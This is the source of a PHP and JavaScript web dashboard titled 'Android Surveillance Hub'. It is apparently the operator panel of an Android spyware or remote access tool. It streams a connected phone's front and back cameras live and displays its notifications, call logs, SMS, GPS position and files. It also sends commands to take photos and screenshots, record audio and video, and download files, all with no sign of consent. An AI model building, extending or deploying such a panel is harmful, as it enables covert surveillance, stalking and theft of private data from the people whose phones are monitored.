<?php
require_once __DIR__ . '/auth.php';
$adminUser = htmlspecialchars($_SESSION['username'] ?? 'Admin');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Surveillance Hub</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Courier New',monospace; background:linear-gradient(135deg,#0d0d0d,#1a1a1a); color:#00ff00; min-height:100vh; display:flex; flex-direction:column; }

        /* HEADER */
        .header { background:linear-gradient(135deg,#0a0f1c,#1c2526); padding:10px 20px; box-shadow:0 4px 20px rgba(0,255,0,0.1); position:sticky; top:0; z-index:200; border-bottom:1px solid #00ff00; display:flex; align-items:center; gap:16px; }
        .header h1 { font-size:1.4rem; font-weight:700; color:#00ff00; text-shadow:0 0 10px rgba(0,255,0,0.5); flex:1; text-align:center; }
        .header-badge { font-size:0.78rem; color:#00aa00; white-space:nowrap; }
        .server-tag { font-size:0.68rem; color:#448844; padding:3px 8px; border:1px solid #1a3a1a; border-radius:4px; white-space:nowrap; max-width:180px; overflow:hidden; text-overflow:ellipsis; }
        .logout-btn { padding:6px 14px; background:transparent; border:1px solid #ff4444; color:#ff6666; border-radius:6px; font-family:'Courier New',monospace; font-size:0.8rem; cursor:pointer; transition:all .2s; white-space:nowrap; }
        .logout-btn:hover { background:rgba(255,68,68,0.15); box-shadow:0 0 10px rgba(255,68,68,0.3); }
        #status { font-size:0.8rem; padding:4px 12px; background:#1a1a1a; border-radius:6px; border:1px solid #00ff00; white-space:nowrap; }

        /* SHELL */
        .app-shell { display:flex; flex:1; overflow:hidden; height:calc(100vh - 52px); }

        /* SIDEBAR */
        .device-sidebar { width:240px; min-width:200px; background:linear-gradient(180deg,#0a0f1c,#111820); border-right:1px solid #00ff00; display:flex; flex-direction:column; overflow:hidden; }
        .sidebar-header { padding:14px 16px 10px; font-size:0.78rem; color:#00aa00; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid #1a2a1a; display:flex; align-items:center; justify-content:space-between; }
        .device-count { background:#00ff00; color:#0d0d0d; border-radius:10px; padding:1px 7px; font-size:0.72rem; font-weight:700; }
        .device-list { flex:1; overflow-y:auto; padding:8px; scrollbar-width:thin; scrollbar-color:#00ff00 #0a0f1c; }
        .device-item { display:flex; align-items:center; gap:10px; padding:10px 12px; border-radius:10px; border:1px solid transparent; cursor:pointer; transition:all .2s; margin-bottom:6px; }
        .device-item:hover { background:rgba(0,255,0,0.07); border-color:#00ff0044; }
        .device-item.active { background:rgba(0,255,0,0.13); border-color:#00ff00; box-shadow:0 0 10px rgba(0,255,0,0.15); }
        .device-dot { width:9px; height:9px; border-radius:50%; flex-shrink:0; }
        .device-dot.online { background:#00ff00; box-shadow:0 0 6px #00ff00; }
        .device-dot.offline { background:#555; }
        .device-info { flex:1; min-width:0; }
        .device-name { font-size:0.82rem; color:#b6ffb6; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
        .device-sub { font-size:0.68rem; color:#449944; margin-top:2px; }
        .no-devices { color:#336633; font-size:0.8rem; text-align:center; padding:30px 16px; }

        /* DASHBOARD */
        .dashboard { flex:1; overflow-y:auto; padding:18px; scrollbar-width:thin; scrollbar-color:#00ff00 #0a0f1c; }
        .no-device-selected { display:flex; flex-direction:column; align-items:center; justify-content:center; height:60vh; color:#336633; font-size:1rem; }
        .no-device-selected .big-icon { font-size:3rem; margin-bottom:16px; }

        /* CONTROL BAR */
        .control-bar { display:flex; gap:10px; margin-bottom:16px; flex-wrap:wrap; align-items:center; }
        .ctrl-btn { padding:7px 16px; background:#0a1a0a; border:1px solid #00ff00; color:#00ff00; border-radius:8px; font-family:'Courier New',monospace; font-size:0.82rem; cursor:pointer; transition:all .2s; }
        .ctrl-btn:hover { background:rgba(0,255,0,0.12); box-shadow:0 0 10px rgba(0,255,0,0.2); }
        .ctrl-btn:disabled { opacity:0.4; cursor:not-allowed; }
        .ctrl-btn.danger { border-color:#ff4444; color:#ff6666; }
        .ctrl-btn.danger:hover { background:rgba(255,68,68,0.12); }
        .ctrl-btn.active-rec { border-color:#ff0000; color:#ff0000; animation:pulse 1s infinite; }
        .device-title { font-size:1rem; color:#00ff00; font-weight:700; flex:1; }

        /* CAPTURE PANEL */
        .capture-panel {
            background:linear-gradient(135deg,#0a0f1c,#1c2526);
            border:1px solid #00ff00; border-radius:14px; padding:16px;
            margin-bottom:18px; box-shadow:0 4px 20px rgba(0,255,0,0.1);
        }
        .capture-panel h2 { color:#00ff00; font-size:0.95rem; font-weight:600; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
        .capture-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:10px; margin-bottom:14px; }
        .cap-btn {
            display:flex; flex-direction:column; align-items:center; gap:6px;
            padding:14px 10px; background:#0d1a0d; border:1px solid #1a3a1a;
            border-radius:10px; cursor:pointer; transition:all .2s; color:#00ff00;
            font-family:'Courier New',monospace; font-size:0.78rem;
        }
        .cap-btn:hover { border-color:#00ff00; background:rgba(0,255,0,0.08); box-shadow:0 0 12px rgba(0,255,0,0.15); }
        .cap-btn:disabled { opacity:0.35; cursor:not-allowed; }
        .cap-btn .icon { font-size:1.6rem; }
        .cap-btn.recording { border-color:#ff0000; color:#ff4444; animation:pulse 1s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }

        /* CAPTURE RESULTS */
        .capture-results { display:flex; flex-wrap:wrap; gap:10px; }
        .capture-result-item {
            background:#0d0d0d; border:1px solid #1a3a1a; border-radius:8px;
            padding:8px; position:relative; max-width:260px;
        }
        .capture-result-item img, .capture-result-item video, .capture-result-item audio {
            max-width:240px; border-radius:6px; display:block;
        }
        .capture-result-item audio { width:240px; }
        .capture-result-meta { font-size:0.68rem; color:#448844; margin-top:6px; }
        .capture-dl-btn {
            position:absolute; top:6px; right:6px;
            padding:3px 8px; background:#0a1a0a; border:1px solid #00ff00;
            color:#00ff00; border-radius:4px; font-size:0.68rem;
            cursor:pointer; font-family:'Courier New',monospace;
        }
        .no-captures { color:#336633; font-size:0.8rem; padding:10px; }

        /* MAIN GRID */
        .main-layout { display:grid; grid-template-columns:1fr 1fr; gap:18px; }
        .video-section { display:flex; flex-direction:column; gap:18px; }
        .video-container { background:linear-gradient(135deg,#0a0f1c,#1c2526); border-radius:14px; padding:16px; border:1px solid #00ff00; box-shadow:0 4px 20px rgba(0,255,0,0.15); }
        .video-header { display:flex; align-items:center; margin-bottom:10px; }
        .video-header h2 { color:#00ff00; font-size:1rem; margin:0; }
        .live-indicator { background:#ff0000; color:#fff; padding:3px 7px; border-radius:4px; font-size:0.65rem; font-weight:700; margin-left:auto; animation:pulse 2s infinite; }
        .remote-video { width:100%; aspect-ratio:16/9; background:#0d0d0d; border-radius:10px; border:1px solid #00ff00; object-fit:cover; }
        .content-right { display:flex; flex-direction:column; gap:16px; }
        .card { background:linear-gradient(135deg,#0a0f1c,#1c2526); border-radius:14px; padding:16px; border:1px solid #00ff00; box-shadow:0 4px 20px rgba(0,255,0,0.1); }
        .card h2 { color:#00ff00; font-size:0.95rem; font-weight:600; margin-bottom:12px; display:flex; align-items:center; gap:8px; }
        .card-icon { width:18px; height:18px; background:#00ff00; border-radius:4px; display:grid; place-items:center; font-size:0.7rem; color:#0d0d0d; flex-shrink:0; }
        .scrollable { height:180px; overflow-y:auto; scrollbar-width:thin; scrollbar-color:#00ff00 #0a0f1c; }
        .scrollable-lg { height:280px; overflow-y:auto; scrollbar-width:thin; scrollbar-color:#00ff00 #0a0f1c; }
        .notification,.call-log,.sms-message { background:#1a1a1a; padding:10px 12px; margin-bottom:8px; border-radius:8px; border:1px solid #1a3a1a; font-size:0.8rem; transition:border-color .2s; }
        .notification:hover,.call-log:hover,.sms-message:hover { border-color:#00ff00; }
        .notification p,.call-log p,.sms-message p { margin:2px 0; color:#b6ffb6; }
        .timestamp { font-size:0.7rem; color:#448844; }
        #mapContainer { height:280px; border-radius:10px; overflow:hidden; }
        .fs-toolbar { display:flex; gap:8px; margin-bottom:10px; }
        .fs-toolbar input { flex:1; background:#0d0d0d; border:1px solid #1a3a1a; color:#00ff00; padding:5px 10px; border-radius:6px; font-family:'Courier New',monospace; font-size:0.8rem; }
        .fs-toolbar button { padding:5px 12px; border-radius:6px; border:1px solid #00ff00; background:transparent; color:#00ff00; font-family:'Courier New',monospace; font-size:0.78rem; cursor:pointer; }
        #fileList { height:200px; overflow-y:auto; background:#0d0d0d; border-radius:8px; padding:8px; scrollbar-width:thin; scrollbar-color:#00ff00 #0d0d0d; }
        #logMessages { font-size:0.75rem; color:#00ff00; line-height:1.5; max-height:100px; overflow-y:auto; scrollbar-width:thin; scrollbar-color:#00ff00 #0d0d0d; }

        /* LOADER */
        #ashLoadingOverlay { position:fixed; inset:0; z-index:9000; background:radial-gradient(60% 60% at 50% 50%,rgba(0,255,0,0.06),transparent 70%),linear-gradient(135deg,#0b0f0b,#0f1510); display:grid; place-items:center; transition:opacity .6s ease,visibility .6s ease; }
        #ashLoadingOverlay.ash-hide { opacity:0; visibility:hidden; pointer-events:none; }
        .ash-orb { width:120px; height:120px; border:2px solid #00ff00; border-radius:50%; box-shadow:0 0 18px #00ff00; animation:spin 6s linear infinite; }
        @keyframes spin { to { transform:rotate(360deg); } }
        .ash-label { text-align:center; margin-top:16px; color:#00ff00; font-size:0.9rem; animation:flicker 2s infinite; }
        @keyframes flicker { 0%,100%{opacity:.7} 50%{opacity:1} }

        @media (max-width:900px) {
            .main-layout { grid-template-columns:1fr; }
            .app-shell { flex-direction:column; height:auto; }
            .device-sidebar { width:100%; min-width:unset; height:auto; max-height:180px; border-right:none; border-bottom:1px solid #00ff00; }
            .device-list { display:flex; gap:8px; overflow-x:auto; padding:8px; }
            .device-item { min-width:140px; margin-bottom:0; }
        }
    </style>
</head>
<body>

<div id="ashLoadingOverlay">
    <div>
        <div class="ash-orb"></div>
        <div class="ash-label">CONNECTING TO SERVER…</div>
    </div>
</div>

<div class="header">
    <span class="header-badge">👤 <?= $adminUser ?></span>
    <h1>Android Surveillance Hub</h1>
    <div id="status">Connecting…</div>
    <span class="server-tag" id="serverTag">⚡ …</span>
    <button class="logout-btn" onclick="window.location.href='logout.php'">⏏ Logout</button>
</div>

<div class="app-shell">
    <div class="device-sidebar">
        <div class="sidebar-header">
            Devices
            <span class="device-count" id="deviceCount">0</span>
        </div>
        <div class="device-list" id="deviceList">
            <div class="no-devices">No devices online yet…</div>
        </div>
    </div>

    <div class="dashboard" id="dashboard">
        <div class="no-device-selected" id="noDeviceMsg">
            <div class="big-icon">📡</div>
            <div>Select a device from the sidebar to begin</div>
        </div>

        <div id="dashContent" style="display:none">

            <!-- Control Bar -->
            <div class="control-bar">
                <span class="device-title" id="selectedDeviceName">—</span>
                <button class="ctrl-btn" onclick="sendTorchOn()">🔦 Torch ON</button>
                <button class="ctrl-btn" onclick="sendTorchOff()">💡 Torch OFF</button>
                <button class="ctrl-btn" onclick="sendSwitchCamera()">🔄 Switch Cam</button>
                <button class="ctrl-btn" onclick="requestSync()">🔃 Sync Data</button>
            </div>

            <!-- ════════════════════════════════════════════════
                 CAPTURE & RECORD PANEL
            ═════════════════════════════════════════════════ -->
            <div class="capture-panel">
                <h2>🎯 Capture &amp; Record Controls</h2>

                <div class="capture-grid">
                    <!-- Photo -->
                    <button class="cap-btn" id="btnPhoto" onclick="capturePhoto()">
                        <span class="icon">📸</span>
                        Capture Photo
                    </button>

                    <!-- Screenshot -->
                    <button class="cap-btn" id="btnScreenshot" onclick="captureScreenshot()">
                        <span class="icon">🖥️</span>
                        Screenshot
                    </button>

                    <!-- Voice Record -->
                    <button class="cap-btn" id="btnVoice" onclick="toggleVoiceRecord()">
                        <span class="icon">🎙️</span>
                        <span id="voiceLabel">Record Voice</span>
                    </button>

                    <!-- Video Record -->
                    <button class="cap-btn" id="btnVideo" onclick="toggleVideoRecord()">
                        <span class="icon">🎥</span>
                        <span id="videoLabel">Record Video</span>
                    </button>
                </div>

                <!-- Results gallery -->
                <div style="font-size:0.78rem;color:#448844;margin-bottom:8px;">📁 Captured Files <span id="captureCount" style="background:#00ff00;color:#0d0d0d;border-radius:8px;padding:1px 6px;font-size:0.7rem;">0</span> &nbsp;<button onclick="clearCaptures()" style="background:transparent;border:1px solid #ff4444;color:#ff6666;border-radius:4px;padding:2px 8px;cursor:pointer;font-size:0.68rem;font-family:'Courier New',monospace;">Clear All</button></div>
                <div class="capture-results" id="captureResults">
                    <div class="no-captures">No captures yet — use buttons above ☝</div>
                </div>
            </div>

            <!-- Main Grid -->
            <div class="main-layout">
                <div class="video-section">
                    <div class="video-container">
                        <div class="video-header"><h2>📷 Front Camera</h2><div class="live-indicator">● LIVE</div></div>
                        <video id="remoteVideoFront" class="remote-video" autoplay playsinline muted></video>
                    </div>
                    <div class="video-container">
                        <div class="video-header"><h2>📷 Back Camera</h2><div class="live-indicator">● LIVE</div></div>
                        <video id="remoteVideoBack" class="remote-video" autoplay playsinline muted></video>
                    </div>
                </div>

                <div class="content-right">
                    <div class="card">
                        <h2><div class="card-icon">🔔</div>Notifications</h2>
                        <div class="scrollable" id="notificationList"></div>
                    </div>
                    <div style="display:flex;gap:14px;">
                        <div class="card" style="flex:1">
                            <h2><div class="card-icon">📞</div>Call Logs</h2>
                            <div class="scrollable-lg" id="callLogList"></div>
                        </div>
                        <div class="card" style="flex:1">
                            <h2><div class="card-icon">💬</div>SMS</h2>
                            <div class="scrollable-lg" id="smsList"></div>
                        </div>
                    </div>
                    <div class="card">
                        <h2><div class="card-icon">📂</div>File Explorer</h2>
                        <div class="fs-toolbar">
                            <button id="fsBackBtn">⬆ Up</button>
                            <input type="text" id="fsPathInput" value="/storage/emulated/0/">
                            <button id="fsGoBtn">Go</button>
                        </div>
                        <div id="fileList"><div style="color:#336633;text-align:center;padding:20px">Select device first</div></div>
                    </div>
                    <div class="card">
                        <h2><div class="card-icon">📍</div>GPS Location</h2>
                        <div id="mapContainer"></div>
                    </div>
                    <div class="card">
                        <h2>Debug Log</h2>
                        <div id="logMessages"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Step 1: Render URL from PHP -->
<script src="config.js.php"></script>
<!-- Step 2: Dynamically load socket.io.js FROM Render -->
<script>
(function(){
    document.getElementById('serverTag').textContent = '⚡ ' + RENDER_SERVER_URL.replace('https://','');
    var s = document.createElement('script');
    s.src = RENDER_SERVER_URL + '/socket.io/socket.io.js';
    s.onload  = function(){ initDashboard(); };
    s.onerror = function(){
        document.getElementById('ashLoadingOverlay').innerHTML =
            '<div style="color:#ff4444;text-align:center;padding:40px;font-size:0.95rem">❌ Cannot load Socket.IO from Render.<br><br><code style="color:#ffaa00">'+RENDER_SERVER_URL+'</code><br><br>Check config.js.php and CORS in server.js</div>';
        document.getElementById('status').textContent = '❌ Render unreachable';
        document.getElementById('status').style.color = '#ff4444';
    };
    document.head.appendChild(s);
})();
</script>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
// ════════════════════════════════════════════════════════════════
// Dashboard — connects to Render Node.js (cross-origin)
// PHP only handles login/session. All real-time = Node.js/Render.
// ════════════════════════════════════════════════════════════════

const ICE_SERVERS = [
    { urls:'stun:stun.l.google.com:19302' },
    { urls:'stun:stun1.l.google.com:19302' },
    { urls:'turn:freestun.net:3478',  username:'free', credential:'free' },
    { urls:'turns:freestun.net:5349', username:'free', credential:'free' },
    { urls:'turn:global.relay.metered.ca:80',  username:'openrelayproject', credential:'openrelayproject' },
    { urls:'turn:global.relay.metered.ca:443', username:'openrelayproject', credential:'openrelayproject' },
    { urls:'turns:global.relay.metered.ca:443?transport=tcp', username:'openrelayproject', credential:'openrelayproject' },
];

const devices = {};
let selectedDeviceId  = null;
let leafletMap        = null;
let leafletMarker     = null;
let socket            = null;
let isRecordingVoice  = false;
let isRecordingVideo  = false;
const captureItems    = [];   // all captured blobs for gallery

// ── Loader ───────────────────────────────────────────────────────
const _overlay = document.getElementById('ashLoadingOverlay');
function hideLoader(){
    _overlay?.classList.add('ash-hide');
    _overlay?.addEventListener('transitionend',()=>_overlay?.remove(),{once:true});
}
window.addEventListener('load',()=>setTimeout(hideLoader,5000));

// ── Init ─────────────────────────────────────────────────────────
function initDashboard(){
    socket = io(RENDER_SERVER_URL,{ transports:['websocket'], reconnectionAttempts:Infinity, withCredentials:false });

    socket.on('connect',()=>{ updateStatus('✅ Connected','#00ff00'); hideLoader(); socket.emit('identify','web'); log('Connected: '+RENDER_SERVER_URL); });
    socket.on('disconnect',()=>updateStatus('❌ Disconnected','#ff4444'));
    socket.on('connect_error',e=>{ updateStatus('⚠ Error','#ffaa00'); log('Socket error: '+e.message); });

    socket.on('device-list', list=>{
        list.forEach(d=>{ const id=d.socketId||d.id; devices[id]={socketId:id,name:d.name||('Device-'+id.substr(0,6)),online:d.online!==false,peer:null,frontTrack:null,backTrack:null}; });
        renderSidebar();
        if(!selectedDeviceId&&Object.keys(devices).length>0) selectDevice(Object.keys(devices)[0]);
    });
    socket.on('android-device-connected',data=>{
        const id=data.socketId||data.id, name=data.name||('Device-'+id.substr(0,6));
        if(!devices[id]) devices[id]={socketId:id,name,online:true,peer:null,frontTrack:null,backTrack:null};
        else{ devices[id].online=true; devices[id].name=name; }
        log('Device connected: '+name); renderSidebar();
        if(!selectedDeviceId) selectDevice(id);
        initPeerForDevice(id);
    });
    socket.on('android-device-disconnected',data=>{
        const id=data.socketId||data.id||data;
        if(devices[id]){ devices[id].online=false; log('Offline: '+devices[id].name); renderSidebar(); if(selectedDeviceId===id) updateStatus('⚠ Device offline','#ffaa00'); }
    });
    socket.on('signal',msg=>{
        const fid=msg.from;
        if(!devices[fid]){ devices[fid]={socketId:fid,name:'Device-'+fid.substr(0,6),online:true,peer:null,frontTrack:null,backTrack:null}; renderSidebar(); }
        handleSignal(fid,msg.signal);
    });

    // ── Data events ────────────────────────────────────────────────
    socket.on('notification',msg=>{
        if(msg.from!==selectedDeviceId&&msg.deviceId!==selectedDeviceId) return;
        const n=msg.notification, el=document.getElementById('notificationList'); if(!el) return;
        const div=document.createElement('div'); div.className='notification';
        div.innerHTML=`<p><strong>${escHtml(n.appName)}</strong>: ${escHtml(n.title)}</p><p class="timestamp">${escHtml(n.timestamp)}</p>`;
        el.prepend(div); if(el.children.length>50) el.removeChild(el.lastChild);
    });
    socket.on('call_log',msg=>{
        if(msg.from!==selectedDeviceId) return;
        const list=document.getElementById('callLogList'); if(!list) return; list.innerHTML='';
        (msg.call_logs||[]).forEach(c=>{ const d=document.createElement('div'); d.className='call-log'; d.innerHTML=`<p>${escHtml(c.type)}: ${escHtml(c.number)}</p><p class="timestamp">${escHtml(c.date)} · ${c.duration}s</p>`; list.appendChild(d); });
    });
    socket.on('sms',msg=>{
        if(msg.from!==selectedDeviceId) return;
        const list=document.getElementById('smsList'); if(!list) return; list.innerHTML='';
        (msg.sms_messages||[]).forEach(s=>{ const d=document.createElement('div'); d.className='sms-message'; d.innerHTML=`<p>${escHtml(s.type)} · ${escHtml(s.address)}</p><p>${escHtml((s.body||'').substr(0,120))}</p><p class="timestamp">${escHtml(s.date)}</p>`; list.appendChild(d); });
    });
    socket.on('location',msg=>{ if(msg.from===selectedDeviceId) updateMap(msg.latitude,msg.longitude); });
    socket.on('fs:files',msg=>{ if(msg.from===selectedDeviceId) renderFileList(msg.file_list); });

    // ── Capture & Record results ───────────────────────────────────
    socket.on('capture:photo:result',      msg=>{ if(msg.from===selectedDeviceId) addCaptureResult('photo',      msg.imageBase64, msg.mimeType||'image/jpeg'); });
    socket.on('capture:screenshot:result', msg=>{ if(msg.from===selectedDeviceId) addCaptureResult('screenshot', msg.imageBase64, msg.mimeType||'image/png'); });
    socket.on('record:voice:result',       msg=>{ if(msg.from===selectedDeviceId){ addCaptureResult('audio', msg.audioBase64, msg.mimeType||'audio/mp4', msg.duration); setVoiceRecordingUI(false); }});
    socket.on('record:video:result',       msg=>{ if(msg.from===selectedDeviceId){ addCaptureResult('video', msg.videoBase64, msg.mimeType||'video/mp4', msg.duration); setVideoRecordingUI(false); }});
}

// ════════════════════════════════════════════════════════════════
// Capture & Record
// ════════════════════════════════════════════════════════════════

function capturePhoto(){
    if(!selectedDeviceId){ alert('Select a device first'); return; }
    document.getElementById('btnPhoto').disabled=true;
    setTimeout(()=>document.getElementById('btnPhoto').disabled=false, 3000);
    socket.emit('capture:photo',{ to:selectedDeviceId, from:socket.id });
    log('📸 Capture photo sent');
}

function captureScreenshot(){
    if(!selectedDeviceId){ alert('Select a device first'); return; }
    document.getElementById('btnScreenshot').disabled=true;
    setTimeout(()=>document.getElementById('btnScreenshot').disabled=false, 3000);
    socket.emit('capture:screenshot',{ to:selectedDeviceId, from:socket.id });
    log('🖥️ Screenshot request sent');
}

function toggleVoiceRecord(){
    if(!selectedDeviceId){ alert('Select a device first'); return; }
    if(!isRecordingVoice){
        socket.emit('record:voice:start',{ to:selectedDeviceId, from:socket.id });
        setVoiceRecordingUI(true);
        log('🎙️ Voice recording started');
    } else {
        socket.emit('record:voice:stop',{ to:selectedDeviceId, from:socket.id });
        log('🎙️ Voice recording stop sent');
    }
}

function toggleVideoRecord(){
    if(!selectedDeviceId){ alert('Select a device first'); return; }
    if(!isRecordingVideo){
        socket.emit('record:video:start',{ to:selectedDeviceId, from:socket.id });
        setVideoRecordingUI(true);
        log('🎥 Video recording started');
    } else {
        socket.emit('record:video:stop',{ to:selectedDeviceId, from:socket.id });
        log('🎥 Video recording stop sent');
    }
}

function setVoiceRecordingUI(active){
    isRecordingVoice = active;
    const btn = document.getElementById('btnVoice');
    const lbl = document.getElementById('voiceLabel');
    btn.classList.toggle('recording', active);
    lbl.textContent = active ? '⏹ Stop Voice' : 'Record Voice';
}

function setVideoRecordingUI(active){
    isRecordingVideo = active;
    const btn = document.getElementById('btnVideo');
    const lbl = document.getElementById('videoLabel');
    btn.classList.toggle('recording', active);
    lbl.textContent = active ? '⏹ Stop Video' : 'Record Video';
}

function addCaptureResult(type, b64, mime, duration){
    if(!b64){ log('⚠ Empty '+type+' result'); return; }
    const ts   = new Date().toLocaleTimeString();
    const ext  = mime.split('/')[1] || type;
    const blob = b64toBlob(b64, mime);
    const url  = URL.createObjectURL(blob);
    const fname = type+'_'+Date.now()+'.'+ext;
    captureItems.unshift({ type, url, mime, fname, ts, duration });
    renderCaptureGallery();
    log(`✅ ${type} received @ ${ts}`);
}

function b64toBlob(b64, mime){
    const bytes = atob(b64);
    const ab = new ArrayBuffer(bytes.length);
    const ia = new Uint8Array(ab);
    for(let i=0;i<bytes.length;i++) ia[i]=bytes.charCodeAt(i);
    return new Blob([ab],{type:mime});
}

function renderCaptureGallery(){
    const el = document.getElementById('captureResults');
    document.getElementById('captureCount').textContent = captureItems.length;
    if(captureItems.length===0){ el.innerHTML='<div class="no-captures">No captures yet — use buttons above ☝</div>'; return; }
    el.innerHTML='';
    captureItems.forEach(item=>{
        const div = document.createElement('div');
        div.className='capture-result-item';
        let media='';
        if(item.type==='photo'||item.type==='screenshot')
            media=`<img src="${item.url}" alt="${item.type}">`;
        else if(item.type==='audio')
            media=`<audio controls src="${item.url}"></audio>`;
        else if(item.type==='video')
            media=`<video controls src="${item.url}" style="max-width:240px"></video>`;
        div.innerHTML=`${media}<button class="capture-dl-btn" onclick="dlCapture('${item.url}','${item.fname}')">⬇ Save</button><div class="capture-result-meta">${item.type.toUpperCase()} · ${item.ts}${item.duration?' · '+item.duration+'s':''}</div>`;
        el.appendChild(div);
    });
}

function dlCapture(url, fname){
    const a=document.createElement('a'); a.href=url; a.download=fname; a.click();
}
function clearCaptures(){
    captureItems.length=0;
    renderCaptureGallery();
}

// ════════════════════════════════════════════════════════════════
// Helpers
// ════════════════════════════════════════════════════════════════

function updateStatus(msg,color){ const el=document.getElementById('status'); if(el){el.textContent=msg;el.style.color=color||'#00ff00';} }
function log(msg){ const el=document.getElementById('logMessages'); if(!el)return; const l=document.createElement('div'); l.textContent='['+new Date().toLocaleTimeString()+'] '+msg; el.prepend(l); if(el.children.length>80)el.removeChild(el.lastChild); }
function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function renderSidebar(){
    const list=document.getElementById('deviceList'), count=document.getElementById('deviceCount'), ids=Object.keys(devices);
    count.textContent=ids.filter(id=>devices[id].online).length;
    if(ids.length===0){list.innerHTML='<div class="no-devices">No devices online yet…</div>';return;}
    list.innerHTML='';
    ids.forEach(id=>{
        const d=devices[id], div=document.createElement('div');
        div.className='device-item'+(id===selectedDeviceId?' active':'');
        div.innerHTML=`<div class="device-dot ${d.online?'online':'offline'}"></div><div class="device-info"><div class="device-name">${escHtml(d.name)}</div><div class="device-sub">${d.online?'🟢 Online':'🔴 Offline'}</div></div>`;
        div.onclick=()=>selectDevice(id);
        list.appendChild(div);
    });
}

function selectDevice(id){
    selectedDeviceId=id;
    const d=devices[id];
    document.getElementById('noDeviceMsg').style.display='none';
    document.getElementById('dashContent').style.display='block';
    document.getElementById('selectedDeviceName').textContent=d.name;
    attachVideoTracks(id); clearDataPanels(); renderSidebar(); log('Switched: '+d.name); initMap();
}
function attachVideoTracks(id){
    const d=devices[id]; if(!d)return;
    const fv=document.getElementById('remoteVideoFront'), bv=document.getElementById('remoteVideoBack');
    fv.srcObject=d.frontTrack?new MediaStream([d.frontTrack]):null;
    bv.srcObject=d.backTrack?new MediaStream([d.backTrack]):null;
}
function clearDataPanels(){
    ['notificationList','callLogList','smsList'].forEach(id=>{const el=document.getElementById(id);if(el)el.innerHTML='';});
    document.getElementById('fileList').innerHTML='<div style="color:#336633;text-align:center;padding:20px">Waiting…</div>';
    document.getElementById('logMessages').innerHTML='';
}

function initPeerForDevice(id){
    if(devices[id].peer){try{devices[id].peer.close();}catch(e){}}
    const peer=new RTCPeerConnection({iceServers:ICE_SERVERS});
    devices[id].peer=peer;
    peer.ontrack=e=>{
        if(e.track.kind==='video'){
            if(!devices[id].frontTrack) devices[id].frontTrack=e.track;
            else devices[id].backTrack=e.track;
            if(id===selectedDeviceId) attachVideoTracks(id);
        }
    };
    peer.onicecandidate=e=>{ if(!e.candidate)return; socket.emit('signal',{to:id,from:socket.id,signal:{candidate:e.candidate}}); };
    peer.onconnectionstatechange=()=>{
        log(devices[id].name+' peer: '+peer.connectionState);
        if(id!==selectedDeviceId)return;
        if(peer.connectionState==='connected')    updateStatus('✅ Streaming','#00ff00');
        if(peer.connectionState==='disconnected') updateStatus('⚠ Peer disconnected','#ffaa00');
        if(peer.connectionState==='failed')       updateStatus('❌ Peer failed','#ff4444');
    };
}
async function handleSignal(fromId,signal){
    if(!devices[fromId])return;
    if(!devices[fromId].peer) initPeerForDevice(fromId);
    const peer=devices[fromId].peer;
    try{
        if(signal.type==='offer'){
            if(peer.signalingState!=='stable'){initPeerForDevice(fromId);return handleSignal(fromId,signal);}
            await peer.setRemoteDescription(new RTCSessionDescription(signal));
            const ans=await peer.createAnswer();
            await peer.setLocalDescription(ans);
            socket.emit('signal',{to:fromId,from:socket.id,signal:ans});
        } else if(signal.candidate){
            await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
        }
    }catch(e){log('Signal error ['+fromId+']: '+e.message);}
}

function sendToSelected(event,payload){ if(!selectedDeviceId){alert('Select a device first');return;} socket.emit(event,{to:selectedDeviceId,from:socket.id,...payload}); }
function sendTorchOn()      { sendToSelected('torch',        {on:true});  }
function sendTorchOff()     { sendToSelected('torch',        {on:false}); }
function sendSwitchCamera() { sendToSelected('switch_camera',{});         }
function requestSync()      { sendToSelected('sync_data',    {});         }

document.getElementById('fsGoBtn')?.addEventListener('click',()=>{ sendToSelected('fs:list',{path:document.getElementById('fsPathInput')?.value||'/storage/emulated/0/'}); });
document.getElementById('fsBackBtn')?.addEventListener('click',()=>{
    const cur=document.getElementById('fsPathInput')?.value||'/';
    const up=cur.replace(/\/+$/,'').split('/').slice(0,-1).join('/')||'/';
    document.getElementById('fsPathInput').value=up+'/';
    sendToSelected('fs:list',{path:up+'/'});
});

function renderFileList(data){
    const el=document.getElementById('fileList'); if(!el)return;
    document.getElementById('fsPathInput').value=data.currentPath||'/';
    el.innerHTML='';
    if(!data.files||data.files.length===0){el.innerHTML='<div style="color:#336633;text-align:center;padding:16px">Empty</div>';return;}
    data.files.forEach(f=>{
        const row=document.createElement('div');
        row.style.cssText='display:flex;align-items:center;gap:8px;padding:5px 4px;border-bottom:1px solid #1a2a1a;cursor:pointer;font-size:0.8rem;color:#b6ffb6;';
        row.innerHTML=`<span>${f.isDir?'📁':'📄'}</span><span style="flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(f.name)}</span><span style="color:#448844;font-size:0.7rem">${f.isDir?'':formatBytes(f.size)}</span>`;
        if(f.isDir){ row.onclick=()=>{document.getElementById('fsPathInput').value=f.path+'/';sendToSelected('fs:list',{path:f.path+'/'});}; }
        else{ const btn=document.createElement('button'); btn.textContent='⬇'; btn.style.cssText='padding:2px 6px;background:transparent;border:1px solid #00ff00;color:#00ff00;border-radius:4px;cursor:pointer;font-size:0.7rem;'; btn.onclick=e=>{e.stopPropagation();sendToSelected('fs:download',{path:f.path});}; row.appendChild(btn); }
        el.appendChild(row);
    });
}
function formatBytes(b){ if(!b)return '0 B'; const k=1024,s=['B','KB','MB','GB'],i=Math.floor(Math.log(b)/Math.log(k)); return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+s[i]; }
